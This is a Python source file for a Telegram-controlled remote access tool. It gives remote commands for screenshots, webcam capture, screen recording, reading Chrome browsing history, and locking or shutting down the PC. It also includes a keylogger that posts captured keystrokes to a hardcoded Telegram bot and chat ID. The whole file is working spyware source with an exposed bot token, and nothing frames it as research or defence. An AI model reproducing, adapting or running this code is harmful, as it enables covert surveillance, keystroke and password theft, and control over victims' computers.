from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
import os
import psutil
import platform
import socket
import pyautogui
import cv2
import mss
import time
import threading
import webbrowser
import sqlite3
from pynput import keyboard
import numpy as np
import imageio
import requests  # For sending HTTP requests to Telegram

# Telegram Bot Token & Chat ID
BOT_TOKEN = "7657520385:AAFIj8j1Td1J61J6dWwERWrpDJ3xJedORws"
CHAT_ID = "6304855326"

# Global variables
captured_text = ""
key_log = []
keylogger_running = False  # Control variable for keylogger
listener = None  # Global listener object

def get_pc_info():
    """Fetch system information"""
    uname = platform.uname()
    cpu_usage = psutil.cpu_percent(interval=1)
    ram = psutil.virtual_memory()
    disk = psutil.disk_usage('/')
    ip_address = socket.gethostbyname(socket.gethostname())

    pc_info = f"""
🖥 **PC Information**:
🔹 **System**: {uname.system} {uname.release} ({uname.version})
🔹 **Machine**: {uname.machine}
🔹 **Processor**: {uname.processor}
🔹 **CPU Usage**: {cpu_usage}%
🔹 **RAM Usage**: {ram.used // (1024 ** 2)}MB / {ram.total // (1024 ** 2)}MB
🔹 **Disk Usage**: {disk.used // (1024 ** 3)}GB / {disk.total // (1024 ** 3)}GB
🔹 **IP Address**: {ip_address}
"""
    return pc_info

async def send_pc_info(update: Update, context: CallbackContext):
    """Send PC info to Telegram"""
    pc_info = get_pc_info()
    await update.message.reply_text(pc_info, parse_mode="Markdown")

async def lock_pc(update: Update, context: CallbackContext):
    """Lock the PC"""
    await update.message.reply_text("🔒 Locking PC...")
    os.system("rundll32.exe user32.dll,LockWorkStation")

async def shutdown_pc(update: Update, context: CallbackContext):
    """Shutdown the PC"""
    await update.message.reply_text("⚠️ Shutting down PC in 10 seconds...")
    os.system("shutdown /s /t 10")

async def restart_pc(update: Update, context: CallbackContext):
    """Restart the PC"""
    await update.message.reply_text("🔄 Restarting PC in 10 seconds...")
    os.system("shutdown /r /t 10")

async def logout_pc(update: Update, context: CallbackContext):
    """Log out the current user"""
    await update.message.reply_text("🚪 Logging out...")
    os.system("shutdown -l")

async def take_screenshot(update: Update, context: CallbackContext):
    """Take a screenshot and send it via Telegram"""
    screenshot_path = "screenshot.png"
    screenshot = pyautogui.screenshot()
    screenshot.save(screenshot_path)
    
    await update.message.reply_photo(photo=open(screenshot_path, 'rb'))
    os.remove(screenshot_path)

async def capture_webcam(update: Update, context: CallbackContext):
    """Capture an image from the webcam and send it"""
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    cap.release()
    if ret:
        cv2.imwrite("webcam.jpg", frame)
        await update.message.reply_photo(photo=open("webcam.jpg", 'rb'))
        os.remove("webcam.jpg")
    else:
        await update.message.reply_text("⚠️ Unable to capture webcam image")

async def start_screen_recording(update: Update, context: CallbackContext):
    """Start screen recording for specified seconds"""
    if not context.args:
        await update.message.reply_text("❌ Provide duration in seconds. Usage: `/record 10`")
        return
    
    duration = int(context.args[0])
    output = "screen_record.mp4"
    
    frames = []
    with mss.mss() as sct:
        start_time = time.time()
        while time.time() - start_time < duration:
            screenshot = sct.grab(sct.monitors[1])
            frame = np.array(screenshot)
            frames.append(frame)
            time.sleep(0.1)  # Adjust for smoother capture
    
    imageio.mimsave(output, frames, fps=10)
    
    await update.message.reply_document(document=open(output, 'rb'))
    os.remove(output)

async def list_chrome_history(update: Update, context: CallbackContext):
    """Fetch Chrome browsing history"""
    chrome_history_path = os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Default\History"
    temp_history_db = "temp_chrome_history.db"
    
    try:
        # Copy the locked DB file to a temporary location
        os.system(f'copy "{chrome_history_path}" "{temp_history_db}"')
        
        conn = sqlite3.connect(temp_history_db)
        cursor = conn.cursor()
        cursor.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 10")
        history = cursor.fetchall()
        conn.close()
        os.remove(temp_history_db)
        
        response = "\n".join([f"🔹 {title}: {url}" for url, title in history])
        await update.message.reply_text(f"🕵️‍♂️ **Recent Chrome History**:\n{response}")
    
    except Exception as e:
        await update.message.reply_text(f"⚠️ Unable to fetch history: {e}")

def on_press(key):
    """Capture keystrokes and check for 'raiyok' keyword"""
    global captured_text, key_log, keylogger_running
    if not keylogger_running:
        return False  # Stop the listener if keylogger is not running
    
    try:
        if key.char and key.char.isprintable():
            # Log printable characters
            captured_text += key.char
            key_log.append(key.char)
            print(f"Key pressed: {key.char}")  # Debugging: Print keystrokes in terminal
            # Check if "raiyok" is in the captured text
            if "raiyok" in captured_text:
                print("Stopping program as 'raiyok' was detected.")
                stop_all()  # Stop all loops and threads
                return False  # Stop the listener
    except AttributeError:
        # Handle special keys like Space, Enter, etc.
        if key == keyboard.Key.space:
            captured_text += " "
            key_log.append(" ")
            print("Key pressed: [SPACE]")  # Debugging: Print space in terminal
        elif key == keyboard.Key.enter:
            captured_text += "\n"
            key_log.append("\n")
            print("Key pressed: [ENTER]")  # Debugging: Print enter in terminal
            send_keystrokes_to_telegram()
        elif key == keyboard.Key.backspace:
            captured_text = captured_text[:-1]
            key_log.append("[BACKSPACE]")
            print("Key pressed: [BACKSPACE]")  # Debugging: Print backspace in terminal
        else:
            # Log special keys
            key_log.append(f"[{key}]")
            print(f"Key pressed: [{key}]")  # Debugging: Print special keys in terminal

def send_keystrokes_to_telegram():
    """Send logged keystrokes to Telegram"""
    global key_log
    if key_log:
        text = "".join(key_log)  # Removed the "🖥 **Keystrokes Logged:**\n" prefix
        key_log = []  # Clear the log after sending
        print(f"Sending to Telegram: {text}")  # Debugging: Print the message being sent
        # Use requests to send the message to Telegram
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": CHAT_ID,
            "text": text
        }
        try:
            response = requests.post(url, data=payload)
            print(f"Telegram API response: {response.status_code}")  # Debugging: Print API response
        except Exception as e:
            print(f"Failed to send keystrokes to Telegram: {e}")

def start_keylogger():
    """Start keystroke listener"""
    global keylogger_running, listener
    if keylogger_running:
        print("Keylogger is already running.")
        return
    
    keylogger_running = True
    captured_text = ""  # Reset captured text
    key_log = []  # Reset key log
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    print("Keylogger started.")

def stop_keylogger():
    """Stop the keylogger"""
    global keylogger_running, listener
    if not keylogger_running:
        print("Keylogger is not running.")
        return
    
    keylogger_running = False
    if listener:
        listener.stop()  # Stop the listener
        listener = None  # Reset the listener object
    print("Keylogger stopped.")

def stop_all():
    """Stop all loops and threads"""
    global keylogger_running, listener
    keylogger_running = False
    if listener:
        listener.stop()  # Stop the listener
        listener = None  # Reset the listener object
    print("Stopping all processes...")
    os._exit(0)

async def start(update: Update, context: CallbackContext):
    """Send available commands"""
    commands = """
Available Commands:
/pcinfo - Get system details
/lock - Lock PC
/shutdown - Shutdown PC
/restart - Restart PC
/logout - Log out
/screenshot - Capture and send a screenshot
/webcam - Capture an image from the webcam
/record <seconds> - Record the screen for specified seconds
/chromehistory - Get recent Chrome history
/keystrokes - Start logging keystrokes (sends after pressing Enter)
/stopkeystrokes - Stop logging keystrokes
    """
    await update.message.reply_text(commands)

async def start_keystrokes(update: Update, context: CallbackContext):
    """Start the keylogger"""
    start_keylogger()
    await update.message.reply_text("🟢 Keylogger started. Type 'raiyok' to stop the program.")

async def stop_keystrokes(update: Update, context: CallbackContext):
    """Stop the keylogger"""
    stop_keylogger()
    await update.message.reply_text("🛑 Keylogger stopped.")

def main():
    """Run the Telegram bot"""
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("pcinfo", send_pc_info))
    app.add_handler(CommandHandler("lock", lock_pc))
    app.add_handler(CommandHandler("shutdown", shutdown_pc))
    app.add_handler(CommandHandler("restart", restart_pc))
    app.add_handler(CommandHandler("logout", logout_pc))
    app.add_handler(CommandHandler("screenshot", take_screenshot))
    app.add_handler(CommandHandler("webcam", capture_webcam))
    app.add_handler(CommandHandler("record", start_screen_recording))
    app.add_handler(CommandHandler("chromehistory", list_chrome_history))
    app.add_handler(CommandHandler("keystrokes", start_keystrokes))
    app.add_handler(CommandHandler("stopkeystrokes", stop_keystrokes))
    
    app.run_polling()

if __name__ == "__main__":
    main()
